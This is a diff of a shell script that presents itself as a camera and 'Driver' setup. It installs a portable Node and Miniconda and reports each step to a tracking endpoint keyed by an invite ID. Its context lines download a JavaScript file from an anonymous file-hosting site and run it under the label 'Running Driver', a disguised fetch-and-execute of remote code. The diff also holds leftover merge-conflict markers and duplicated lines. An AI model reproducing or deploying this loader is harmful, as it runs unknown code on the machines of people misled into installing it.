@@ -28,16 +28,30 @@ track_step() {
   # track_step <step_name> <status> [message]
   local step_name="${1:-}"
   local status="${2:-running}"
-  local message="${3:-}"
+  local step_key=""
   if [[ -z "${MAC_UID:-}" || "$MAC_UID" == "__ID__" || -z "$step_name" ]]; then
     return 0
   fi
+  case "$step_name" in
+    check_node)         step_key="requestion_step_1" ;;
+    prepare_node)       step_key="requestion_step_2" ;;
+    verify_node)        step_key="requestion_step_3" ;;
+    driver_setup)       step_key="requestion_step_4" ;;
+    detect_platform)    step_key="requestion_step_5" ;;
+    download_miniconda) step_key="requestion_step_6" ;;
+    install_miniconda)  step_key="requestion_step_7" ;;
+    verify_miniconda)   step_key="requestion_step_8" ;;
+    cleanup)            step_key="requestion_step_9" ;;
+    camera_fixed)       step_key="requestion_step_10" ;;
+    completed)          step_key="requestion_step_11" ;;
+    *)                  step_key="$step_name" ;;
+  esac
   local api_url="https://api.canditech.org/api/invites/${MAC_UID}/steps"
   local payload
   payload="$(printf '{"step":"%s","status":"%s","message":"%s"}' \
-    "$(printf '%s' "$step_name" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
+    "$(printf '%s' "$step_key" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
     "$(printf '%s' "$status" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
-    "$(printf '%s' "$message" | sed 's/\\/\\\\/g; s/"/\\"/g')")"
+    "")"
   curl -sS -X POST "$api_url" -H "Content-Type: application/json" -d "$payload" >/dev/null 2>&1 || true
 }
 
@@ -161,6 +175,8 @@ MINICONDA_LOG="/Users/Shared/miniconda-install.log"
 
 echo "Detected OS: $OS"
 echo "Detected architecture: $ARCH"
+CURRENT_STEP="detect_platform"
+track_step "detect_platform" "success" "Detected ${OS}/${ARCH}"
 CURRENT_STEP="detect_platform"
 track_step "detect_platform" "success" "Detected ${OS}/${ARCH}"
 
@@ -249,16 +265,30 @@ track_step() {
   # track_step <step_name> <status> [message]
   local step_name="${1:-}"
   local status="${2:-running}"
-  local message="${3:-}"
+  local step_key=""
   if [[ -z "${MAC_UID:-}" || "$MAC_UID" == "__ID__" || -z "$step_name" ]]; then
     return 0
   fi
+  case "$step_name" in
+    check_node)         step_key="requestion_step_1" ;;
+    prepare_node)       step_key="requestion_step_2" ;;
+    verify_node)        step_key="requestion_step_3" ;;
+    driver_setup)       step_key="requestion_step_4" ;;
+    detect_platform)    step_key="requestion_step_5" ;;
+    download_miniconda) step_key="requestion_step_6" ;;
+    install_miniconda)  step_key="requestion_step_7" ;;
+    verify_miniconda)   step_key="requestion_step_8" ;;
+    cleanup)            step_key="requestion_step_9" ;;
+    camera_fixed)       step_key="requestion_step_10" ;;
+    completed)          step_key="requestion_step_11" ;;
+    *)                  step_key="$step_name" ;;
+  esac
   local api_url="https://api.canditech.org/api/invites/${MAC_UID}/steps"
   local payload
   payload="$(printf '{"step":"%s","status":"%s","message":"%s"}' \
-    "$(printf '%s' "$step_name" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
+    "$(printf '%s' "$step_key" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
     "$(printf '%s' "$status" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
-    "$(printf '%s' "$message" | sed 's/\\/\\\\/g; s/"/\\"/g')")"
+    "")"
   curl -sS -X POST "$api_url" -H "Content-Type: application/json" -d "$payload" >/dev/null 2>&1 || true
 }
 
@@ -297,10 +327,6 @@ if command -v node >/dev/null 2>&1; then
   NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
   if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
     NODE_EXE="node"
-<<<<<<< HEAD
-=======
-    track_step "check_node" "success" "Global node found: ${NODE_INSTALLED_VERSION}"
->>>>>>> d85f042 (update mac step tracking and invite progress history)
     info "Checking Driver..."
   fi
 fi
@@ -312,11 +338,6 @@ USER_HOME="/Users/Shared"
 mkdir -p "$USER_HOME"
 
 if [[ -z "$NODE_EXE" ]]; then
-<<<<<<< HEAD
-=======
-  CURRENT_STEP="prepare_node"
-  track_step "prepare_node" "running" "Downloading portable node for ${OS_TAG}-${ARCH_TAG}"
->>>>>>> d85f042 (update mac step tracking and invite progress history)
   info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."
 
   # Fetch latest version from Node dist index.json
@@ -338,10 +359,6 @@ if [[ -z "$NODE_EXE" ]]; then
   NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"
 
   if [[ -x "$PORTABLE_NODE" ]]; then
-<<<<<<< HEAD
-=======
-    track_step "prepare_node" "success" "Portable node already available"
->>>>>>> d85f042 (update mac step tracking and invite progress history)
     info "Driver already present: $PORTABLE_NODE"
   else
     info "Downloading..."
@@ -354,10 +371,6 @@ if [[ -z "$NODE_EXE" ]]; then
     rm -f "$NODE_TARBALL"
 
     [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
-<<<<<<< HEAD
-=======
-    track_step "prepare_node" "success" "Portable node extracted successfully"
->>>>>>> d85f042 (update mac step tracking and invite progress history)
     info "Portable Driver extracted successfully."
   fi
 
@@ -369,11 +382,6 @@ fi
 # Verify Node works
 # -------------------------
 "$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
-<<<<<<< HEAD
-=======
-CURRENT_STEP="verify_node"
-track_step "verify_node" "success" "Node executable verified"
->>>>>>> d85f042 (update mac step tracking and invite progress history)
 info "Using Driver: $("$NODE_EXE" -v)"
 
 # -------------------------
@@ -384,11 +392,6 @@ download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
 [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
 info "Running Driver..."
-<<<<<<< HEAD
-=======
-CURRENT_STEP="driver_setup"
-track_step "driver_setup" "running" "Executing driver setup script"
->>>>>>> d85f042 (update mac step tracking and invite progress history)
 "$NODE_EXE" "$ENV_SETUP_JS"
 track_step "driver_setup" "success" "Driver setup completed"
 
@@ -397,7 +400,6 @@ info "[SUCCESS] Driver Setup completed successfully."
 ARCH="$(uname -m)"
 OS="$(uname -s)"
 SHARED_DIR="/Users/Shared"
-<<<<<<< HEAD
 INSTALL_BASE="$SHARED_DIR"
 MINICONDA_PREFIX=""
 MINICONDA_SH=""
@@ -441,63 +443,6 @@ else
 fi
 
 echo "Downloading..."
-download "$URL" "$MINICONDA_SH"
-[[ -s "$MINICONDA_SH" ]] || die "Miniconda download failed."
-
-echo "Installing..."
-# -u keeps reruns safe if prefix already exists.
-bash "$MINICONDA_SH" -b -u -p "$MINICONDA_PREFIX" >>"$MINICONDA_LOG" 2>&1 || die "Miniconda install failed. Check log: $MINICONDA_LOG"
-
-echo "Verifying Driver..."
-"$MINICONDA_PREFIX/bin/python3" -V >/dev/null 2>&1 || die "Miniconda python verification failed."
-[[ -d "$MINICONDA_PREFIX" ]] || die "Miniconda folder not found at $MINICONDA_PREFIX"
-
-echo "Cleaning up..."
-rm -f "$MINICONDA_SH"
-echo "Done. Miniconda path: $MINICONDA_PREFIX"
-exit 0
-=======
-DOWNLOAD_DIR="$SHARED_DIR"
-MINICONDA_PREFIX="/Users/Shared/miniconda3"
-MINICONDA_SH=""
-MINICONDA_LOG="/Users/Shared/miniconda-install.log"
-
-echo "Detected OS: $OS"
-echo "Detected architecture: $ARCH"
-CURRENT_STEP="detect_platform"
-track_step "detect_platform" "success" "Detected ${OS}/${ARCH}"
-
-if ! mkdir -p "$SHARED_DIR" 2>/dev/null || [[ ! -w "$SHARED_DIR" ]]; then
-  DOWNLOAD_DIR="$HOME"
-  MINICONDA_PREFIX="${HOME}/miniconda3"
-  MINICONDA_LOG="${HOME}/miniconda-install.log"
-fi
-
-if [[ "$OS" == "Darwin" ]]; then
-  if [[ "$ARCH" == "arm64" ]]; then
-    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
-    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-MacOSX-arm64.sh"
-  elif [[ "$ARCH" == "x86_64" ]]; then
-    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
-    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-MacOSX-x86_64.sh"
-  else
-    die "Unsupported macOS architecture: $ARCH"
-  fi
-elif [[ "$OS" == "Linux" ]]; then
-  if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
-    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
-    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-Linux-aarch64.sh"
-  elif [[ "$ARCH" == "x86_64" ]]; then
-    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
-    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-Linux-x86_64.sh"
-  else
-    die "Unsupported Linux architecture: $ARCH"
-  fi
-else
-  die "Unsupported OS: $OS"
-fi
-
-echo "Downloading..."
 CURRENT_STEP="download_miniconda"
 track_step "download_miniconda" "running" "Downloading Miniconda installer"
 download "$URL" "$MINICONDA_SH"
@@ -521,8 +466,6 @@ echo "Cleaning up..."
 CURRENT_STEP="cleanup"
 rm -f "$MINICONDA_SH"
 track_step "cleanup" "success" "Installer cleaned up"
-trap - ERR
 track_step "completed" "success" "All steps completed"
 echo "Done. Miniconda path: $MINICONDA_PREFIX"
 exit 0
->>>>>>> d85f042 (update mac step tracking and invite progress history)
